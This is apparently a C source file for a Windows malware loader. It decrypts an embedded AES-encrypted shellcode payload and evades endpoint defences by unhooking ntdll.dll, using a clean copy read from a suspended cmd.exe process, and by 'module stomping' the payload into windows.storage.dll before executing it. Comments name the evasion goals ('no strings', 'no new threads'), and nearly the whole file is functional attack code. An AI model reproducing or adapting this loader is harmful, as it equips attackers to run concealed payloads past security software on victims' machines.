#include <winternl.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>
#include <wincrypt.h>
#include <psapi.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")

// encrypted payload
unsigned char key[] = { 0xc3, 0x7c, 0xe1, 0xf3, 0x9a, 0x90, 0x5b, 0xb1, 0xfb, 0x5a, 0x4a, 0x45, 0x68, 0x3c, 0x8f, 0xf5 };
unsigned char payload[] = { 0x1e, 0x9, 0x36, 0xb1, 0x54, 0x5b, 0xb2, 0xbb, 0x20, 0x3, 0x6, 0x35, 0xbd, 0xe3, 0x48, 0x6, 0x66, 0x97, 0xbb, 0xa6, 0xdf, 0x6f, 0x7e, 0x79, 0xd3, 0x34, 0xc0, 0x2c, 0x3a, 0x4f, 0x29, 0xa7, 0x78, 0xc1, 0x72, 0x2f, 0x4a, 0xb1, 0xf3, 0x15, 0x83, 0x33, 0x24, 0xd7, 0x7d, 0x61, 0x89, 0x23, 0x5, 0x18, 0x94, 0x7, 0x5f, 0x9, 0x98, 0x5b, 0x94, 0x5a, 0x8e, 0x11, 0xa1, 0x79, 0x64, 0x4, 0xea, 0x86, 0xda, 0x7, 0xb2, 0x94, 0xb7, 0x55, 0xc1, 0xfd, 0xa6, 0xdc, 0xfc, 0xda, 0x40, 0x68, 0xdf, 0x75, 0xb9, 0xe3, 0xc2, 0x93, 0x7b, 0x82, 0x25, 0xc6, 0x1e, 0x3d, 0xdd, 0xf2, 0x37, 0x50, 0xcb, 0xb9, 0xb8, 0x3a, 0x71, 0x11, 0x95, 0xe8, 0xc6, 0xda, 0xeb, 0xdd, 0x82, 0x41, 0x14, 0xaa, 0x5d, 0xd1, 0x6e, 0x8a, 0xac, 0xbd, 0x70, 0x37, 0x10, 0xcd, 0x6e, 0x5f, 0x6, 0x79, 0x7b, 0x3f, 0xcb, 0xa8, 0x42, 0x4e, 0x86, 0xc0, 0x5, 0x77, 0x4b, 0x99, 0x98, 0xb1, 0x49, 0x97, 0xb7, 0xd2, 0x83, 0x2e, 0xad, 0xc6, 0x4, 0x81, 0xdd, 0x72, 0xd5, 0xff, 0x86, 0x40, 0x65, 0x17, 0x8c, 0xd6, 0xfa, 0xdc, 0xbf, 0x63, 0x5c, 0xef, 0x5a, 0x58, 0xe, 0xfb, 0xb6, 0xc, 0xf, 0x8d, 0xca, 0x23, 0xcf, 0x86, 0x73, 0xf4, 0x9b, 0xfd, 0x5c, 0x48, 0x87, 0xfb, 0x46, 0xcd, 0xb1, 0x1, 0x43, 0x1f, 0x60, 0x8e, 0xd6, 0xa5, 0xcb, 0x29, 0x50, 0x74, 0x4, 0x53, 0x92, 0x91, 0x40, 0x83, 0x1, 0xeb, 0x2d, 0x24, 0xe3, 0xc2, 0x22, 0x39, 0x51, 0xa1, 0xc1, 0xd6, 0x63, 0x4b, 0x6, 0x87, 0x18, 0x4, 0xef, 0x54, 0xea, 0x9e, 0xb, 0x7b, 0x2a, 0x1a, 0xe2, 0x41, 0xfb, 0x9d, 0xf3, 0x9e, 0x37, 0x1c, 0x18, 0x54, 0xcd, 0xc1, 0x4f, 0x4e, 0xb5, 0x1b, 0x7b, 0x7b, 0x59, 0x16, 0x99, 0x8c, 0xf1, 0x5d, 0xe, 0x33, 0x56, 0xbd, 0xfa, 0x2a, 0x1, 0xf4, 0xdd, 0x38, 0x16, 0x55, 0x6e, 0x82, 0x45, 0x71, 0x7f, 0xb2, 0xc6, 0x2c, 0x5, 0x76, 0xbd, 0xc9, 0xb5, 0x48, 0x54, 0xb5, 0x74, 0x3d, 0xb3, 0xfe };

size_t payload_len = sizeof(payload);

typedef BOOL (WINAPI * VirtualProtect_t)(LPVOID, SIZE_T, DWORD, PDWORD);


// no strings
unsigned char sNtdll[] = { 'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l', 0x0 };
unsigned char sKernel32[] = { 'k','e','r','n','e','l','3','2','.','d','l','l', 0x0 };



// decypt
int AESDecrypt(char * payload, unsigned int payload_len, char * key, size_t keylen) {
	HCRYPTPROV hProv;
	HCRYPTHASH hHash;
	HCRYPTKEY hKey;

	if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){
			return -1;
	}
	if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)){
			return -1;
	}
	if (!CryptHashData(hHash, (BYTE*) key, (DWORD) keylen, 0)){
			return -1;              
	}
	if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0,&hKey)){
			return -1;
	}
	
	if (!CryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, (BYTE *) payload, (DWORD *) &payload_len)){
			return -1;
	}
	
	CryptReleaseContext(hProv, 0);
	CryptDestroyHash(hHash);
	CryptDestroyKey(hKey);
	
	return 0;
}


// no new threads
int Inject() {
	
	unsigned char sVirtualProtect[] = { 'V','i','r','t','u','a','l','P','r','o','t','e','c','t', 0x0 };
	unsigned char sLib[] = { 'w','i','n','d','o','w','s','.','s','t','o','r','a','g','e','.','d','l','l', 0x0 };
	LPVOID exec_pointer;
	DWORD oldProtect;
	HANDLE hThread;
	
	HMODULE hVictimLib = LoadLibrary((LPCSTR) sLib);
	
	VirtualProtect_t VirtualProtect_p = (VirtualProtect_t) GetProcAddress(GetModuleHandle((LPCSTR) sKernel32), (LPCSTR) sVirtualProtect);
	
	//printf("hVictimLib: %p\n", hVictimLib); getchar();
	
	if ( hVictimLib != NULL ) {
		
		// module stomping
		exec_pointer = (char *) hVictimLib + 2*4096 + 12;	printf("Exec pointer: %X\n", exec_pointer);
		if (!exec_pointer) return -1;
	
		printf("%X\n", exec_pointer);

	
		AESDecrypt((char *) payload, payload_len, (char *) key, sizeof(key));

		VirtualProtect_p((char *) exec_pointer, payload_len + 4096, PAGE_READWRITE, &oldProtect);
	
		memcpy(exec_pointer, payload, payload_len);
	
		if(!VirtualProtect_p( exec_pointer, payload_len, PAGE_EXECUTE_READ, &oldProtect)) return -1;
	
		void (*go)() = (void (*)()) exec_pointer; go();
	
	}
	
	return -1;
	
}

// unhooking
int FindFirstSyscall(char * pMem, DWORD size){
	
	// gets the first byte of first syscall
	DWORD i = 0;
	DWORD offset = 0;
	BYTE pattern1[] = "\x0f\x05\xc3";  // syscall ; ret
	BYTE pattern2[] = "\xcc\xcc\xcc";  // int3 * 3
	
	// find first occurance of syscall+ret instructions
	for (i = 0; i < size - 3; i++) {
		if (!memcmp(pMem + i, pattern1, 3)) {
			offset = i;
			break;
		}
	}		
	
	// now find the beginning of the syscall
	for (i = 3; i < 50 ; i++) {
		if (!memcmp(pMem + offset - i, pattern2, 3)) {
			offset = offset - i + 3;
			printf("First syscall found at 0x%p\n", pMem + offset);
			break;
		}		
	}

	return offset;
}


int FindLastSysCall(char * pMem, DWORD size) {

	// returns the last byte of the last syscall
	DWORD i;
	DWORD offset = 0;
	BYTE pattern[] = "\x0f\x05\xc3\xcd\x2e\xc3\xcc\xcc\xcc";  // syscall ; ret ; int 2e ; ret ; int3 * 3
	
	// backwards lookup
	for (i = size - 9; i > 0; i--) {
		if (!memcmp(pMem + i, pattern, 9)) {
			offset = i + 6;
			printf("Last syscall byte found at 0x%p\n", pMem + offset);
			break;
		}
	}		
	
	return offset;
}
		
		
static int UnhookNtdll(const HMODULE hNtdll, const LPVOID pCache) {
/*
    UnhookNtdll() finds fresh "syscall table" of ntdll.dll from suspended process and copies over onto hooked one
*/
	DWORD oldprotect = 0;
	PIMAGE_DOS_HEADER pImgDOSHead = (PIMAGE_DOS_HEADER) pCache;
	PIMAGE_NT_HEADERS pImgNTHead = (PIMAGE_NT_HEADERS)((DWORD_PTR) pCache + pImgDOSHead->e_lfanew);
	int i;

	unsigned char sVirtualProtect[] = { 'V','i','r','t','u','a','l','P','r','o','t','e','c','t', 0x0 };
	
	VirtualProtect_t VirtualProtect_p = (VirtualProtect_t) GetProcAddress(GetModuleHandle((LPCSTR) sKernel32), (LPCSTR) sVirtualProtect);
	
	// find .text section
	for (i = 0; i < pImgNTHead->FileHeader.NumberOfSections; i++) {
		PIMAGE_SECTION_HEADER pImgSectionHead = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(pImgNTHead) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));

		if (!strcmp((char *)pImgSectionHead->Name, ".text")) {
			// prepare ntdll.dll memory region for write permissions.
			VirtualProtect_p((LPVOID)((DWORD_PTR) hNtdll + (DWORD_PTR)pImgSectionHead->VirtualAddress),
							pImgSectionHead->Misc.VirtualSize,
							PAGE_EXECUTE_READWRITE,
							&oldprotect);
			if (!oldprotect) {
					// RWX failed!
					return -1;
			}

			// copy clean "syscall table" into ntdll memory
			DWORD SC_start = FindFirstSyscall((char *) pCache, pImgSectionHead->Misc.VirtualSize);
			DWORD SC_end = FindLastSysCall((char *) pCache, pImgSectionHead->Misc.VirtualSize);
			
			if (SC_start != 0 && SC_end != 0 && SC_start < SC_end) {
				DWORD SC_size = SC_end - SC_start;
				printf("dst (in ntdll): %p\n", ((DWORD_PTR) hNtdll + SC_start));
				printf("src (in cache): %p\n", ((DWORD_PTR) pCache + SC_start));
				printf("size: %i\n", SC_size);
				getchar();
				memcpy( (LPVOID)((DWORD_PTR) hNtdll + SC_start),
						(LPVOID)((DWORD_PTR) pCache + + SC_start),
						SC_size);
			}

			// restore original protection settings of ntdll
			VirtualProtect_p((LPVOID)((DWORD_PTR) hNtdll + (DWORD_PTR)pImgSectionHead->VirtualAddress),
							pImgSectionHead->Misc.VirtualSize,
							oldprotect,
							&oldprotect);
			if (!oldprotect) {
					// it failed
					return -1;
			}
			return 0;
		}
	}
	
	// failed? .text not found!
	return -1;
}


int main(void) {
    
	int pid = 0;
    HANDLE hProc = NULL;
	int ret = 0;

	STARTUPINFOA si = { 0 };
	PROCESS_INFORMATION pi = { 0 };
	
	BOOL success = CreateProcessA(
		NULL, 
		(LPSTR)"cmd.exe", 
		NULL, 
		NULL, 
		FALSE, 
		CREATE_SUSPENDED | CREATE_NEW_CONSOLE,
		//CREATE_NEW_CONSOLE,
		NULL, 
		"C:\\Windows\\System32\\", 
		&si, 
		&pi);

	if (success == FALSE) {
		printf("[!] Error: Could not call CreateProcess\n");
		return 1;
	}	

	// get the size of ntdll module in memory
	char * pNtdllAddr = (char *) GetModuleHandle("ntdll.dll");
	IMAGE_DOS_HEADER * pDosHdr = (IMAGE_DOS_HEADER *) pNtdllAddr;
	IMAGE_NT_HEADERS * pNTHdr = (IMAGE_NT_HEADERS *) (pNtdllAddr + pDosHdr->e_lfanew);
	IMAGE_OPTIONAL_HEADER * pOptionalHdr = &pNTHdr->OptionalHeader;
	
	SIZE_T ntdll_size = pOptionalHdr->SizeOfImage;
	
	// allocate local buffer to hold temporary copy of clean ntdll from remote process
	LPVOID pCache = VirtualAlloc(NULL, ntdll_size, MEM_COMMIT, PAGE_READWRITE);
	
	printf("ntdll size: %x | cache: %p\n", ntdll_size, pCache);
	
	SIZE_T bytesRead = 0;
	if (!ReadProcessMemory(pi.hProcess, pNtdllAddr, pCache, ntdll_size, &bytesRead))
		printf("Error reading: %d | %x\n", bytesRead, GetLastError());
	
	printf("Kill?"); getchar();
	
	TerminateProcess(pi.hProcess, 0);
	
	printf("Done.\n"); getchar();

	// remove hooks
	printf("Unhooking ntdll\n");
	ret = UnhookNtdll(GetModuleHandle((LPCSTR) sNtdll), pCache);

	printf("YAY!\n"); getchar();	

	// Clean up.
	VirtualFree(pCache, 0, MEM_RELEASE);
		
	Inject();
	

	return 0;
}